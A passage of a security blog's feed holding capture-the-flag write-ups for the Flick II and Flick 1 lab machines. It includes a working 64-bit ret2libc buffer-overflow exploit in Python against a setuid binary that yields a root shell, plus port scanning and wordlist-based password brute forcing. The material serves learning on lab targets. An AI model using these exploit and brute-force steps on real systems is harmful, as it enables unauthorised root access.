+&lt;p&gt;I think I totally cheated at this point - I went back to bryan and chmodded his home dir and .bashrc file to 777.  Then I was able to set my group.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;[sean@fII storage]$ id
+uid=1002(sean) gid=1002(sean) groups=1002(sean),1001(bryan)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Notice how my &lt;code&gt;gid&lt;/code&gt; is now &lt;code&gt;sean&lt;/code&gt; rather than &lt;code&gt;bryan&lt;/code&gt;.  Now I can execute &lt;code&gt;restore&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;[sean@fII ~]$ /usr/local/bin/restore
+Restore tool v0.1
+Enter the path to the backup.tar.gz: /
+/ does not contain a backup.tar.gz file or access was denied
+
+[sean@fII ~]$ cd /tmp
+[sean@fII tmp]$ touch backup.tar.gz
+
+[sean@fII tmp]$ /usr/local/bin/restore
+Restore tool v0.1
+Enter the path to the backup.tar.gz: /tmp/
+Path is: /tmp/
+Enter the output directory: /tmp/
+Output directory is: /tmp/
+This is a beta, run the following command for now: 
+/bin/sh -c &amp;quot;/usr/bin/tar xf /tmp/backup.tar.gz -C /tmp/ database.sqlite&amp;quot;
+You are currently running this tool as: 
+uid=0(root) gid=0(root) groups=0(root),1001(bryan),1002(sean)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;The command it gives us doesn&amp;rsquo;t look all that useful, but the binary is kind enough to remind us that we are executing with root privs.  As before, I transfered this to my kali box.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# file restore
+restore: setuid ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, for GNU/Linux 2.6.32, BuildID[sha1]=f8c768078fb1214a9777e6a6a50fef30061716d7, not stripped
+
+gdb-peda$ checksec 
+CANARY    : disabled
+FORTIFY   : disabled
+NX        : ENABLED
+PIE       : disabled
+RELRO     : Partial
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;I able to find what appeard to be a buffer overflow in the second input field.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# python -c &#39;print &amp;quot;/root/\n&amp;quot; + &amp;quot;A&amp;quot; * 500&#39; | ./restore
+Restore tool v0.1
+Enter the path to the backup.tar.gz: Path is: /root/
+Enter the output directory: Output directory is: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+Segmentation fault
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# python -c &#39;print &amp;quot;/root/\n&amp;quot; + &amp;quot;A&amp;quot; * 500&#39; &amp;gt; exploit 
+root@kali:~# gdb -q restore
+gdb-peda$ r &amp;lt; exploit 
+
+Program received signal SIGSEGV, Segmentation fault.
+[----------------------------------registers-----------------------------------]
+RAX: 0x7ffd813d71d0 (&#39;A&#39; &amp;lt;repeats 200 times&amp;gt;...)
+RBX: 0x400310 (&amp;lt;_init&amp;gt;:	sub    rsp,0x8)
+RCX: 0x7ffffdf6 
+RDX: 0x6bf600 --&amp;gt; 0x0 
+RSI: 0x7fe366ca2000 (&amp;quot;Enter the output directory: Output directory is: &amp;quot;, &#39;A&#39; &amp;lt;repeats 151 times&amp;gt;...)
+RDI: 0x0 
+RBP: 0x4141414141414141 (&#39;AAAAAAAA&#39;)
+RSP: 0x7ffd813d7218 (&#39;A&#39; &amp;lt;repeats 200 times&amp;gt;...)
+RIP: 0x40101f (&amp;lt;get_out_path+62&amp;gt;:	ret)
+R8 : 0x4141414141414141 (&#39;AAAAAAAA&#39;)
+R9 : 0x4141414141414141 (&#39;AAAAAAAA&#39;)
+R10: 0x1f4 
+R11: 0x246 
+R12: 0x0 
+R13: 0x401710 (&amp;lt;__libc_csu_init&amp;gt;:	push   r14)
+R14: 0x4017a0 (&amp;lt;__libc_csu_fini&amp;gt;:	push   rbx)
+R15: 0x0
+EFLAGS: 0x10202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x401015 &amp;lt;get_out_path+52&amp;gt;:	call   0x402130 &amp;lt;printf&amp;gt;
+   0x40101a &amp;lt;get_out_path+57&amp;gt;:	lea    rax,[rbp-0x40]
+   0x40101e &amp;lt;get_out_path+61&amp;gt;:	leave  
+=&amp;gt; 0x40101f &amp;lt;get_out_path+62&amp;gt;:	ret    
+   0x401020 &amp;lt;do_restore&amp;gt;:	push   rbp
+   0x401021 &amp;lt;do_restore+1&amp;gt;:	mov    rbp,rsp
+   0x401024 &amp;lt;do_restore+4&amp;gt;:	sub    rsp,0x20
+   0x401028 &amp;lt;do_restore+8&amp;gt;:	mov    QWORD PTR [rbp-0x18],rdi
+[------------------------------------stack-------------------------------------]
+0000| 0x7ffd813d7218 (&#39;A&#39; &amp;lt;repeats 200 times&amp;gt;...)
+0008| 0x7ffd813d7220 (&#39;A&#39; &amp;lt;repeats 200 times&amp;gt;...)
+0016| 0x7ffd813d7228 (&#39;A&#39; &amp;lt;repeats 200 times&amp;gt;...)
+0024| 0x7ffd813d7230 (&#39;A&#39; &amp;lt;repeats 200 times&amp;gt;...)
+0032| 0x7ffd813d7238 (&#39;A&#39; &amp;lt;repeats 200 times&amp;gt;...)
+0040| 0x7ffd813d7240 (&#39;A&#39; &amp;lt;repeats 200 times&amp;gt;...)
+0048| 0x7ffd813d7248 (&#39;A&#39; &amp;lt;repeats 200 times&amp;gt;...)
+0056| 0x7ffd813d7250 (&#39;A&#39; &amp;lt;repeats 200 times&amp;gt;...)
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+Stopped reason: SIGSEGV
+0x000000000040101f in get_out_path ()
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;I found the offset to &lt;code&gt;RIP&lt;/code&gt;, using &lt;code&gt;pattern_create&lt;/code&gt; &amp;amp; &lt;code&gt;pattern_offset&lt;/code&gt; in the Metasploit Framework.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;Program received signal SIGSEGV, Segmentation fault.
+[----------------------------------registers-----------------------------------]
+RAX: 0x7ffcf5bc8780 (&amp;quot;Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag&amp;quot;...)
+RBX: 0x400310 (&amp;lt;_init&amp;gt;:	sub    rsp,0x8)
+RCX: 0x7ffffdf6 
+RDX: 0x6bf600 --&amp;gt; 0x0 
+RSI: 0x7fc6d9cde000 (&amp;quot;Output directory is: Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af&amp;quot;...)
+RDI: 0x0 
+RBP: 0x3363413263413163 (&#39;c1Ac2Ac3&#39;)
+RSP: 0x7ffcf5bc87c8 (&amp;quot;Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj&amp;quot;...)
+RIP: 0x40101f (&amp;lt;get_out_path+62&amp;gt;:	ret)
+R8 : 0x7141357141347141 (&#39;Aq4Aq5Aq&#39;)
+R9 : 0x4136704135704134 (&#39;4Ap5Ap6A&#39;)
+R10: 0x1f4 
+R11: 0x246 
+R12: 0x0 
+R13: 0x401710 (&amp;lt;__libc_csu_init&amp;gt;:	push   r14)
+R14: 0x4017a0 (&amp;lt;__libc_csu_fini&amp;gt;:	push   rbx)
+R15: 0x0
+EFLAGS: 0x10206 (carry PARITY adjust zero sign trap INTERRUPT direction overflow)
+
+gdb-peda$ x/wx $rsp
+0x7ffcf5bc87c8:	0x41346341
+
+root@kali:~# /usr/share/metasploit-framework/tools/pattern_offset.rb 0x41346341
+[*] Exact match at offset 72
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Test that offset.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# python -c &#39;print &amp;quot;/root/\n&amp;quot; + &amp;quot;A&amp;quot; * 72 + &amp;quot;BBBBBB&amp;quot;&#39; &amp;gt; exploit 
+
+gdb-peda$ r &amp;lt; exploit 
+
+Stopped reason: SIGSEGV
+0x0000424242424242 in ?? ()
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;With &lt;code&gt;NX&lt;/code&gt; enabled, I like to go for a nice &lt;code&gt;ret2libc&lt;/code&gt;.  So to do that, I first need the address of system.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;gdb-peda$ p system
+$1 = {&amp;lt;text variable, no debug info&amp;gt;} 0x401fd0 &amp;lt;system&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;In 64-bit, parameters are passed in registers. So I need to occupy the &lt;code&gt;RDI&lt;/code&gt; register with &lt;code&gt;/bin/sh&lt;/code&gt; - to do this, I&amp;rsquo;ll use a ROP gadget to pop (rdi) the string &amp;lsquo;/bin/sh&amp;rsquo; from the stack.  The string itself is easy enough to find.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;gdb-peda$ find &#39;/bin/sh&#39;
+Searching for &#39;/bin/sh&#39; in: None ranges
+Found 2 results, display max 2 items:
+restore : 0x492bad --&amp;gt; 0x68732f6e69622f (&#39;/bin/sh&#39;)
+restore : 0x492d20 --&amp;gt; 0x68732f6e69622f (&#39;/bin/sh&#39;)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;To find the gadget, I used &lt;code&gt;ropper&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# ropper --file restore --search &amp;quot;pop rdi&amp;quot;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;There&amp;rsquo;s a perfect instruction here: &lt;code&gt;0x000000000040167e: pop rdi; ret;&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;Now to build the exploit&amp;hellip;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;#!/usr/bin/env python
+
+from struct import *
+
+buf = &amp;quot;&amp;quot;
+buf = &amp;quot;/root/\n&amp;quot;
+buf += &amp;quot;A&amp;quot; * 72                         # junk
+buf += pack(&amp;quot;&amp;lt;Q&amp;quot;, 0x000000000040167e)   # pop rdi; ret
+buf += pack(&amp;quot;&amp;lt;Q&amp;quot;, 0x492bad)             # /bin/sh
+buf += pack(&amp;quot;&amp;lt;Q&amp;quot;, 0x0000000000401fd0)   # system
+
+f = open(&amp;quot;exploit&amp;quot;, &amp;quot;w&amp;quot;)
+f.write(buf)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# ./exploit.py 
+
+root@kali:~# (cat exploit; cat) | ./restore 
+Restore tool v0.1
+Enter the path to the backup.tar.gz: Path is: /root/
+
+Enter the output directory: Output directory is: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA~@
+
+id
+uid=0(root) gid=0(root) groups=0(root)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Seems to work locally&amp;hellip; Transfer it across to Flick II (and change /root/ to /tmp/).&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;[sean@fII tmp]$ ls -l
+
+-rw-rw-r-- 1 sean  sean     0 Sep  8 22:37 backup.tar.gz
+-rw-rw-r-- 1 sean  sean   102 Sep  8 23:00 exploit
+-rwxrwxr-x 1 sean  sean   274 Sep  8 23:00 exploit.py
+-rwxrwxr-x 1 robin robin 8034 Sep  8 22:00 rand.so
+
+[sean@fII tmp]$ (cat exploit; cat) | /usr/local/bin/restore
+
+id; whoami
+uid=0(root) gid=0(root) groups=0(root),1001(bryan),1002(sean)
+root
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;flag:97d1000c18ea8816fa1721a8cb10b128&#34;&gt;Flag&lt;/h2&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;cat /root/flag
+
+  █████▒██▓     ██▓ ▄████▄   ██ ▄█▀ ██▓ ██▓
+▓██   ▒▓██▒    ▓██▒▒██▀ ▀█   ██▄█▒ ▓██▒▓██▒
+▒████ ░▒██░    ▒██▒▒▓█    ▄ ▓███▄░ ▒██▒▒██▒
+░▓█▒  ░▒██░    ░██░▒▓▓▄ ▄██▒▓██ █▄ ░██░░██░
+░▒█░   ░██████▒░██░▒ ▓███▀ ░▒██▒ █▄░██░░██░
+ ▒ ░   ░ ▒░▓  ░░▓  ░ ░▒ ▒  ░▒ ▒▒ ▓▒░▓  ░▓  
+ ░     ░ ░ ▒  ░ ▒ ░  ░  ▒   ░ ░▒ ▒░ ▒ ░ ▒ ░
+ ░ ░     ░ ░    ▒ ░░        ░ ░░ ░  ▒ ░ ▒ ░
+           ░  ░ ░  ░ ░      ░  ░    ░   ░  
+                   ░                       
+
+ You have successfully completed FlickII!
+
+ I hope you learnt as much as I did while
+ making it! Any comments/suggestions etc,
+ feel free to catch me on freenode in
+ #vulnhub or on twitter @leonjza
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Many thanks to leonjza for a brilliant VM - one of my favourites to date.  Shout-out to &lt;a href=&#34;https://twitter.com/superkojiman&#34;&gt;superkojiman&lt;/a&gt; for his excellent &lt;a href=&#34;http://blog.techorganic.com/2015/04/21/64-bit-linux-stack-smashing-tutorial-part-2/&#34;&gt;64-bit Stack Smashing Tutorial&lt;/a&gt; which came in super-handy for this final exercise.&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>Flick: 1</title>
+      <link>http://rastamouse.me/writeups/2014/flick-1/</link>
+      <pubDate>Sat, 16 Aug 2014 00:00:00 +0000</pubDate>
+      
+      <guid>http://rastamouse.me/writeups/2014/flick-1/</guid>
+      <description>
+
+&lt;p&gt;Completing &amp;ldquo;flick&amp;rdquo; will require some sound thinking, good enumeration skills &amp;amp; time!&lt;/p&gt;
+
+&lt;p&gt;The objective is to find and read the flag that lives in /root/.
+As a bonus, can you get root command execution?&lt;/p&gt;
+
+&lt;p&gt;Good Luck! @leonjza&lt;/p&gt;
+
+&lt;h2 id=&#34;port-scan:349ad66c7b20ba925d9eeb00398f8306&#34;&gt;Port Scan&lt;/h2&gt;
+
+&lt;p&gt;When Flick boots up, it&amp;rsquo;s nice enough to display its IP address at the login prompt.  I therefore went straight ahead with an Nmap scan.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# nmap -n -sS -p- 192.168.127.104 &amp;amp;&amp;amp; nmap -n -sU 192.168.127.104
+  
+Not shown: 65533 closed ports
+PORT     STATE SERVICE
+22/tcp   open  ssh
+8881/tcp open  unknown
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;I began by going straight to the service on 8881.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# nc 192.168.127.104 8881 Welcome to the admin server. A correct password will &#39;flick&#39; the switch and open a new door:
+&amp;gt; flick
+OK: flick
+  
+&amp;gt; leonjza
+OK: leonjza
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;No matter what I threw at it, it just echo&amp;rsquo;d it back.  I tried fuzzing it with overflow and format strings etc, but no dice.  Bruteforcing isn&amp;rsquo;t really the way these challenges usually go; but I wrote a short Python script that read in the lines from some simple, short password lists and sent them to the application.  Whilst this was running, I had a look at the SSH port.&lt;/p&gt;
+
+&lt;p&gt;As we&amp;rsquo;ve seen in some previous challenges, simply banner grabbing the SSH service is not always enough.  You won&amp;rsquo;t get to see the contents of &lt;code&gt;/etc/issue&lt;/code&gt; (OS config dependant), until you attempt a proper connection to the service.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# ssh 192.168.127.104
+\x56\x6d\x30\x77\x64\x32\x51\x79\x55\x58\x6c\x56\x57\x47\x78\x57\x56\x30\x64\x34
+\x56\x31\x59\x77\x5a\x44\x52\x57\x4d\x56\x6c\x33\x57\x6b\x52\x53\x57\x46\x4a\x74
+\x65\x46\x5a\x56\x4d\x6a\x41\x31\x56\x6a\x41\x78\x56\x32\x4a\x45\x54\x6c\x68\x68
+[...snip...]
+\x61\x6b\x35\x54\x56\x45\x5a\x73\x56\x56\x46\x59\x61\x46\x4e\x57\x61\x33\x42\x36
+\x56\x6b\x64\x34\x59\x56\x55\x79\x53\x6b\x5a\x58\x57\x48\x42\x58\x56\x6c\x5a\x77
+\x52\x31\x51\x78\x57\x6b\x4e\x56\x62\x45\x4a\x56\x54\x55\x51\x77\x50\x51\x3d\x3d
+  
+ .o88o. oooo   o8o            oooo        
+ 888 `&amp;quot; `888   `&amp;quot;&#39;            `888        
+o888oo   888  oooo   .ooooo.   888  oooo  
+ 888     888  `888  d88&#39; `&amp;quot;Y8  888 .8P&#39;   
+ 888     888   888  888        888888.    
+ 888     888   888  888   .o8  888 `88b.  
+o888o   o888o o888o `Y8bod8P&#39; o888o o888o 
+  
+root @ 192.168.127.104&#39;s password: 
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;A large chuck of hex is printed out, which I saved to a file.  I then stripped the newlines and \x&amp;rsquo;s, then decoded with Python.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~/vuln/flick# cat hex | tr -d &#39;\n&#39; | tr -d &#39;/\\x&#39; &amp;gt;&amp;gt; hex_stripped
+  
+root@kali:~/vuln/flick# python
+&amp;gt;&amp;gt;&amp;gt; string = open(&#39;hex_stripped&#39;, &#39;r&#39;).readline()
+&amp;gt;&amp;gt;&amp;gt; string.decode(&#39;hex&#39;)
+&#39;Vm0wd2QyUXlVWGxWV0d4V1YwZDRWMVl3WkRSWFJteFZVMjA1VjAxV2JETlhhMk0xVmpKS1IySkVUbGhoTVhCUVZteFZlRll5VGtsalJtaG9UVmhDVVZacVFtRlpWMDE1VTJ0V1ZXSkhhRzlVVmxaM1ZsWmFkR05GWkZSTmF6RTFWVEowVjFaWFNraGhSemxWVmpOT00xcFZXbUZrUjA1R1drWndWMDFFUlRGV1ZFb3dWakZhV0ZOcmFHaFNlbXhXVm0xNFlVMHhXbk5YYlVaclVqQTFSMWRyV2xOVWJVcEdZMFZ3VjJKVVJYZFpla3BIVmpGT2RWVnRhRk5sYlhoWFZtMXdUMVF3TUhoalJscFlZbFZhY2xWcVFURlNNVlY1VFZSU1ZrMXJjRmhWTW5SM1ZqSktWVkpZWkZwbGEzQklWbXBHVDJSV1ZuUmhSazVzWWxob1dGWnRNSGhPUm14V1RVaG9XR0pyTlZsWmJGWmhZMnhXYzFWclpGaGlSM1F6VjJ0U1UxWnJNWEpqUm1oV1RXNVNNMVpxU2t0V1ZrcFpXa1p3VjFKV2NIbFdWRUpoVkRKT2RGSnJaRmhpVjNoVVdWUk9RMWRHV25STlZFSlhUV3hHTlZaWE5VOVhSMHBJVld4c1dtSkhhRlJXTUZwVFZqRndSMVJ0ZUdsU2JYY3hWa1phVTFVeFduSk5XRXBxVWxkNGFGVXdhRU5UUmxweFUydGFiRlpzV2xwWGExcDNZa2RGZWxGcmJGZFdNMEpJVmtSS1UxWXhWblZWYlhCVFlrVndWVlp0ZUc5Uk1XUnpWMjVLV0dKSFVtOVVWbHBYVGxaYVdHVkhkR2hpUlhBd1dWVm9UMVp0Um5KT1ZsSlhUVlp3V0ZreFdrdGpiVkpIVld4a2FWSnRPVE5XTW5oWFlqSkZlRmRZWkU1V1ZscFVXV3RrVTFsV1VsWlhiVVpzWWtad2VGVXlkREJXTVZweVYyeHdXbFpXY0hKV1ZFWkxWMVpHY21KR1pGZE5NRXBKVm10U1MxVXhXWGhhU0ZaVllrWktjRlpxVG05V1ZscEhXVE5vYVUxWFVucFdNV2h2V1ZaS1IxTnVRbFZXTTFKNlZHdGFhMk5zV25Sa1JtUnBWbGhDTlZkVVFtRmpNV1IwVTJ0a1dHSlhhR0ZVVmxwM1pXeHJlV1ZIZEd0U2EzQXdXbFZhYTJGV1duSmlla1pYWWxoQ1RGUnJXbEpsUm1SellVWlNhVkp1UWxwV2JYUlhaREZrUjJKSVRtaFNWVFZaVlcxNGQyVkdWblJrUkVKb1lYcEdlVlJzVm5OWGJGcFhZMGhLV2xaWFVrZGFWV1JQVTBkR1IyRkhiRk5pYTBwMlZtMTBVMU14VVhsVVdHeFZZVEZ3YUZWcVNtOVdSbEpZVGxjNWEySkdjRWhXYlRBMVZXc3hXRlZzYUZkTlYyaDJWakJrUzFkV1ZuSlBWbHBvWVRGd1NWWkhlR0ZaVm1SR1RsWmFVRll5YUZoWldIQlhVMFphY1ZOcVVsWk5WMUl3VlRKMGIyRkdTbk5UYkdoVlZsWndNMVpyV21GalZrcDBaRWQwVjJKclNraFdSM2hoVkRKR1YxTnVVbEJXUlRWWVdWUkdkMkZHV2xWU2ExcHNVbTFTZWxsVldsTmhSVEZaVVc1b1YxWXphSEpaYWtaclVqRldjMkZGT1ZkV1ZGWmFWbGN4TkdReVZrZFdibEpyVWtWS2IxbFljRWRsVmxKelZtMDVXR0pHY0ZoWk1HaExWMnhhV0ZWclpHRldNMmhJV1RJeFMxSXhjRWRhUms1WFYwVktNbFp0Y0VkWlYwVjRWbGhvV0ZkSGFGWlpiWGhoVm14c2NsZHJkR3BTYkZwNFZXMTBNRll4V25OalJXaFhWak5TVEZsVVFYaFNWa3B6Vkd4YVUySkZXWHBXVlZwR1QxWkNVbEJVTUQwPQ==&#39;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Unless I&amp;rsquo;m very much mistake, this is a base64 string.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;&amp;gt;&amp;gt;&amp;gt; string.decode(&#39;hex&#39;).decode(&#39;base64&#39;)
+&#39;Vm0wd2QyUXlVWGxWV0d4V1YwZDRXRmxVU205V01WbDNXa2M1VjJKR2JETlhhMXBQVmxVeFYyTkljRmhoTVhCUVZqQmFZV015U2tWVWJHaG9UVlZ3VlZadGNFZFRNazE1VTJ0V1ZXSkhhRzlVVjNOM1pVWmFkR05GWkZwV01ERTFWVEowVjFaWFNraGhSemxWVm14YU0xWnNXbUZrUjA1R1drWlNUbUpGY0VwV2JURXdZekpHVjFOdVVtaFNlbXhXVm1wT1QwMHhjRlpYYlVaclVqQTFSMVV5TVRSVk1rcFhVMnR3VjJKVVJYZFpla3BIVmpGT2RWVnRhRk5sYlhoWFZtMHhORmxWTUhoWGJrNVlZbFZhY2xWc1VrZFhiR3QzV2tSU1ZrMXJjRmhWTW5SM1ZqSktWVkpZWkZwV1JWcHlWVEJhVDJOdFJrZFhiV3hUWVROQ1dGWnRNVEJXTWxGNVZXNU9XR0pIVWxsWmJHaFRWMFpTVjFwR1RteGlSbXcxVkZaU1UxWnJNWEpqUld4aFUwaENTRlpxU2tabFZsWlpXa1p3YkdFelFrbFdWM0JIVkRKU1YxVnVVbXBTYkVwVVZteG9RMWRzV25KWGJHUm9UVlpXTlZaWGVHdGhiRXAwWVVoT1ZtRnJOVlJXTVZwWFkxWktjbVJHVWxkaVJtOTNWMnhXYjJFeFdYZE5WVlpUWWtkU1lWUlZXbUZsYkZweFUydDBWMVpyV2xwWlZWcHJWVEZLV1ZGcmJGZFdNMEpJVmtSS1UxWXhaSFZVYkZKcFZqTm9WVlpHWTNoaU1XUnpWMWhvWVZKR1NuQlVWM1J6VGtaa2NsWnRkRmRpVlhCNVdUQmFjMWR0U2tkWGJXaGFUVlp3ZWxreWVHdGtSa3AwWlVaa2FWWnJiekZXYlhCTFRrWlJlRmRzYUZSaVJuQlpWbXRXZDFkR2JITmhSVTVZVW14d2VGVnRkREJoYXpGeVRsVnNXbFpXY0hKWlZXUkdaVWRPU0dGR2FHbFNia0p2Vm10U1MxUXlUWGxVYTFwaFVqSm9WRlJYTlc5a2JGcEhWbTA1VWsxWFVsaFdNV2h2VjBkS1dWVnJPVlpoYTFwSVZHeGFZVmRGTlZaUFYyaFhZWHBXU0ZacVNqUlZNV1IwVTJ0b2FGSnNTbGhVVlZwM1ZrWmFjVkp0ZEd0V2JrSkhWR3hhVDJGV1NuUlBWRTVYWVRGd2FGWlVSa1psUm1SellVWlNhRTFZUW5oV1YzaHJZakZrUjFWc2FFOVdWVFZaVlcxNGQyVkdWblJrUkVKb1lYcEdlVlJzVm05WGJGcFhZMGhLV2xaWFVrZGFWM2hIWTIxS1IxcEdaRk5XV0VKMlZtcEdZV0V4VlhoWFdHaFZZbXhhVmxscldrdGpSbFp4VW10MFYxWnNjRWhXVjNSTFlUQXhSVkpzVGxaU2JFWXpWVVpGT1ZCUlBUMD0=&#39;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Still base64&amp;hellip; It must be encoded multiple times&amp;hellip; (about 16 as it turned out!).  In the end, I ended up with the following:&lt;/p&gt;
+
+&lt;p&gt;&lt;code&gt;tabupJievas8Knoj&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;I went back to the service on 8881 and entered this as the password.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~/vuln/flick# nc 192.168.127.104 8881
+Welcome to the admin server. A correct password will &#39;flick&#39; the switch and open a new door:
+&amp;gt; tabupJievas8Knoj
+OK: tabupJievas8Knoj
+  
+Accepted! The door should be open now :poolparty:
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Another quick Nmap scan showed that port 80 was now open.&lt;/p&gt;
+
+&lt;h2 id=&#34;flick-a-photo:349ad66c7b20ba925d9eeb00398f8306&#34;&gt;Flick-a-Photo&lt;/h2&gt;
+
+&lt;div align=&#34;center&#34;&gt;
+	&lt;figure style=&#34;background-color: #f2f0ec;&#34; &gt;
+    
+        &lt;img src=&#34;http://rastamouse.me/img/writeups/flick-1/flick-a-photo.jpg&#34;  /&gt;
+    
+    
+&lt;/figure&gt;
+&lt;/div&gt;
+
+&lt;p&gt;This looked to be a photo-gallery type application.  There isn&amp;rsquo;t much to see with the exception of a login page.  There is a give away piece of information here:&lt;/p&gt;
+
+&lt;p&gt;&lt;code&gt;While we are testing the site, use the demo credentials that have been configured for the first user.&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;I first tried &lt;code&gt;demo:demo&lt;/code&gt;, which failed.  I assumed the username was going to be demo, but that the password was slightly more complex.  I used john&amp;rsquo;s jumbo rules to create a password list based on the word &lt;code&gt;demo&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~/vuln/flick# echo demo &amp;gt; wordlist
+root@kali:~/vuln/flick# john --rules=jumbo --wordlist=wordlist --stdout &amp;gt;&amp;gt; wordlist 
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;This created just over 5000 words, which I ran through &lt;code&gt;Hydra&lt;/code&gt;.  Rather annoyingly, it returnded every password as correct and I gave up trying to work out why.  So instead, I fired the wordlist through a make-shift script.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;#!/bin/bash
+  
+wordlist=&amp;quot;/root/vuln/flick/wordlist&amp;quot;
